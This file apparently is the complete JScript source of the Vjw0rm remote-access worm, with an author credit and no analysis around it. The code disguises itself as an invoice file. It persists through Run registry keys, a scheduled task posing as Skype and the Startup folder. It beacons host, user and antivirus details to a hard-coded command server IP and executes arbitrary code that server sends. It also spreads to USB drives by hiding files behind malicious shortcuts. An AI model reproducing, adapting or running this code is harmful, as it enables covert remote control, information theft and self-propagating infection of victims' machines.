// Coded by v_B01 | Sliemerez -> Twitter : Sliemerez

var j = ["WScript.Shell","Scripting.FileSystemObject","Shell.Application","Microsoft.XMLHTTP"];
var g = ["HKCU","HKLM","HKCU\\vjw0rm","\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\","HKLM\\SOFTWARE\\Classes\\","REG_SZ","\\defaulticon\\"];
var y = ["winmgmts:","win32_logicaldisk","Win32_OperatingSystem",'AntiVirusProduct'];

var sh = Cr(0);
var fs = Cr(1);
var spl = "|V|";
var Ch = "\\";
var VN = "Invoice#00928308" + "_" + Ob(6);
var fu = WScript.ScriptFullName;
var wn = WScript.ScriptName;
var U;
try {
U = sh.RegRead(g[2]);
} catch(err) {
var sv = fu.split("\\");
if (":\\" + sv[1] == ":\\" + wn) {
U = "TRUE";
sh.RegWrite(g[2],U,g[5]);
} else {
U = "FALSE";
sh.RegWrite(g[2],U,g[5]);
}
}
Ns();
do {
try {
var P = Pt('Vre','');
P = P.split(spl);

if (P[0] === "Cl") {
WScript.Quit(1);
}

if (P[0] === "Sc") {
var s2 = Ex("temp") + "\\" + P[2];
var fi = fs.CreateTextFile(s2,true);
fi.Write(P[1]);
fi.Close();
sh.run(s2);
}

if (P[0] === "Ex") {
eval(P[1]);
}

if (P[0] === "Rn") {
var ri = fs.OpenTextFile(fu,1);
var fr = ri.ReadAll();
ri.Close();
VN = VN.split("_");
fr = fr.replace(VN[0],P[1]);
var wi = fs.OpenTextFile(fu,2,false);
wi.Write(fr);
wi.Close();
sh.run("wscript.exe //B \"" + fu + "\"");
WScript.Quit(1);
}

if (P[0] === "Up") {
var s2 = Ex("temp") + "\\" + P[2];
var ctf = fs.CreateTextFile(s2,true);
var gu = P[1];
gu = gu.replace("|U|","|V|");
ctf.Write(gu);
ctf.Close();
sh.run("wscript.exe //B \"" + s2 + "\"",6);
WScript.Quit(1);
}

if (P[0] === "Un") {
var s2 = P[1];
var vdr = Ex("Temp") + Ch + wn;
var regi = "FRZKHEKJV3";
s2 = s2.replace("%f",fu).replace("%n",wn).replace("%sfdr",vdr).replace("%RgNe%",regi);
eval(s2);
WScript.Quit(1);
}

if (P[0] === "RF") {
var s2 = Ex("temp") + "\\" + P[2];
var fi = fs.CreateTextFile(s2,true);
fi.Write(P[1]);
fi.Close();
sh.run(s2);
}
} catch(err) {
}
WScript.Sleep(7000);
Spr();
} while (true) ;


function Ex(S) {
return sh.ExpandEnvironmentStrings("%" + S + "%");
}
function Pt(C,A) {
var X = Cr(3);
X.open('POST','http://40.87.151.246:1898/' + C, false);
X.SetRequestHeader("User-Agent:",nf());
X.send(A);
return X.responsetext;
}


function nf() {
var s,NT,i;
if (fs.fileexists(Ex("Windir") + "\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe")) {
NT ="YES";
} else {
NT = "NO";
}
s = VN + Ch + Ex("COMPUTERNAME") + Ch + Ex("USERNAME") + Ch + Ob(2) + Ch + Ob(4) + Ch + Ch + NT + Ch + U + Ch;
return s;
}

function Cr(N) {
	return new ActiveXObject(j[N]);
}

function Ob(N) {
var s;
if (N == 2) {
s = GetObject(y[0]).InstancesOf(y[2]);
var en = new Enumerator(s);
for (; !en.atEnd();en.moveNext()) {
var it = en.item();
return it.Caption;
break;
}
}
if (N == 4) {
var wmg = "winmgmts:\\\\localhost\\root\\securitycenter";
s = GetObject(wmg).InstancesOf(y[3]);
var en = new Enumerator(s);
for (; !en.atEnd();en.moveNext()) {
var it = en.item();
var str = it.DisplayName;
}
if (str !== '') {
wmg = wmg + "2";
s = GetObject(wmg).InstancesOf(y[3]);
en = new Enumerator(s);
for (; !en.atEnd();en.moveNext()) {
it = en.item();
return it.DisplayName;
}
} else {
return it.DisplayName;
}
}
if (N==6) {
s = GetObject(y[0]).InstancesOf(y[1]);
var en = new Enumerator(s);
for (; !en.atEnd();en.moveNext()) {
var it = en.item();
return it.volumeserialnumber;
break;
}
}
}

function Ns() {
	var dr = Ex("TEMP") + Ch + wn;
	try {
		fs.CopyFile(fu,dr,true);
	} catch(err) {
	}
	try {
		sh.RegWrite(g[0] + g[3] + "FRZKHEKJV3","\"" + dr + "\"",g[5]);
		} catch(err) {
	}
	try {
		sh.run("Schtasks /create /sc minute /mo 30 /tn Skype /tr \"" + dr,false);
		} catch(err) {
	}
		
	try {
		var ap = Cr(2);
		fs.CopyFile(fu, ap.NameSpace(7).Self.Path + "\\" + wn,true);
	} catch(err) {
	}
}


function Spr() {
try {
var ld = GetObject(y[0]).InstancesOf(y[1]); 
var edi = new Enumerator(ld);  
for (;!edi.atEnd();edi.moveNext())  
{       
  var dri = edi.item(); 
  var dri = fs.GetDrive(dri.DeviceID); 
  var dp = dri.Path + "\\";
if (dri.IsReady) {
 if (dri.DriveType === 1) {
fs.CopyFile(fu,dp + wn,true);
if (fs.FileExists(dp + wn)) {
fs.GetFile(dp + wn).attributes=2+4;
}
try {
var ef = new Enumerator(fs.GetFolder(dp).SubFolders);
for (;!ef.atEnd();ef.moveNext()) {
	var gf = ef.item();
	gf.attributes=2+4;
wn = wn.replace(" ", "\"" + " " + "\"");
var n = gf.name;
n = n.replace(" ", "\"" + " " + "\"");
var sr = sh.CreateShortCut(dp + gf.name + ".lnk");
sr.WindowStyle = 7;
sr.TargetPath  = "cmd.exe";
sr.Arguments = "/c start " + wn + "&start explorer " + n + "&exit";
var rp = "HKLM\\software\\classes\\folder\\defaulticon\\";
var fic = sh.RegRead(rp);
var ci = sr.IconLocation;
var sci = ",";
if (ci.indexOf(sci) !== -1) {
	sr.IconLocation = fic;
} else {
 sr.IconLocation = gf.Path;
}
sr.Save();
}

} catch(err) {}
try {
var efi = new Enumerator(fs.GetFolder(dp).Files);
for (;!efi.atEnd();efi.moveNext()) {
	var gfi = efi.item();
	var dot = ".";
	var lnk = "lnk";
	if (gfi.name.indexOf(dot) !== -1) {
if (gfi.name.indexOf(lnk) !== -1) {
} else {
	if (gfi.name !== wn) {
		gfi.attributes=2+4;
		var nu = gfi.name;
		nu = nu.replace(" ", "\"" + " " + "\"");
		wn = wn.replace(" ", "\"" + " " + "\"");
		var shr = sh.CreateShortCut(dp + gfi.name + ".lnk");
		shr.WindowStyle=7;
		shr.TargetPath = "cmd.exe";
		shr.Arguments = "/c start " + wn + "&start " + nu + "&exit";
		var sgf = gfi.name.split(".");
		var fvi = sh.RegRead(g[4] + "." + sgf[sgf.length -1] + "\\");
		var fvi2 = sh.RegRead(g[4] + fvi + g[6] + "\\");
		var ci = shr.IconLocation;
var sci = ",";
if (ci.indexOf(sci) !== -1) {
	 shr.IconLocation = fvi2;
} else {
 shr.IconLocation = gfi.Path;
}
		shr.Save();
}
}
}
}
} catch(err) {}
}
}
}

	} catch(err) {

	}
}